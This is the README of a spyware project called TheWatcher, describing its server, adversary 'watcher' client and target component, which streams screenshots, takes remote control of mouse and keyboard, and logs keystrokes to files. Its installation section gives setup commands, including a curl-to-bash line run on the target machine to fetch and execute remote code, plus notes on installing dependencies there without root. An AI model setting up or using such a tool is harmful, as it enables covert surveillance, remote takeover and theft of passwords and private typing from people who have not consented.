# TheWatcher
A spyware you should  be aware of üëÄ!

## Introduction
The watcher is a spyware program that has the ability to share screen, control mouse and keyboard and log keyboard of the target machine.

## Components
- **Server** : The part of the code that runs on the server. It acts as a points of contact for target machine and the adversary(watcher) machine. This is required as the target and watcher cannot communicate from being within their private networks. Using a server allows multiple watchers. It also avoids the condition when watcher is down and target keeps trying to connect to it (if watcher and target are on the same network).
- **Target** : The part of the code that runs on the target machine. It takes instructions from the server (sent by the watcher) and works on it to let the watcher do whatever it wants.
- **Watcher** : The part of the code that runs on the adversary's machine. It lets the adversary send intructions to the target machine through the server.

## Capabilities
- **Screen Reader** : The target screen reader takes screenshots of the target desktop periodically and sends them to the server. The server sends them to all the watcher screen readers who had requested to watch that target.
- **Controller** : The target controller receives controll events from the server (that were sent by the watcher controller) and controls the mouse or keyboard accordingly.
- **Keylogger** : The keylogger listens for keyboard events and sends them to the server. The server sends them to all the watchers watching that target. The watcher keylogger logs the keys in three different files in different ways (file names shown in parenthesis):
    1. The key codes along with action (press or release) (keys\<timestamp\>.vk)
    2. All the key names along with press of release (shown using ‚¨áÔ∏è and ‚¨ÜÔ∏è). (keys\<timestamp\>.verbose)
    3. Only the printable characters. Approximately as typed by the target user. (keys\<timestamp\>.log)

## Installation
```bash
git clone https://github.com/AbhinavYdv/TheWatcher.git
cd TheWatcher

# --- Configuration
# Inside the Watcher, Server and Target directories, their is a Base/settings.py file.
# Set the address and port of your server their.
# These values should be same in the settings.py files of all three.

# --- Server Installation
# copy the 'Server' folder to your server machine and cd into it.
# copy the 'Files' folder to your server machine in the same directory where 'Server' is located
virtualenv .venv
source .venv/bin/activate
pip install pillow
python main.py

# --- Watcher Installation
# copy The 'Watcher' folder to adversary machine and cd into it.
virtualenv .venv
source .venv/bin/activate
pip install pynput kivymd pillow
python main.py

# --- Target Installation
zip -r Target.zip Target
# copy this Target.zip file to 'Files' folder on your server
# run the following on a target machine to install and run target code on it.
curl <server-url>:<server-port>/target_bootstrap.sh | bash
```

### Keylogging and controlling
- [pynput docs](https://pynput.readthedocs.io/en/latest/)

## Research required
- Install linux packages required by our target code on target system without root privileges.
    - Download the required packages using `apt download <package-name>`
    - extarct it using `dpkg -x <file-name>`
    - copy `usr/lib` to `.venv/lib`(virtual env created on target system)
    - copy `usr/include` to `.venv/include`
- Convert keycodes of pynput to characters.
    - went through the source code of pynput to figure out from where is the keycode originating.
    - copied the required data strutures to my code and created functions to convert code to character.
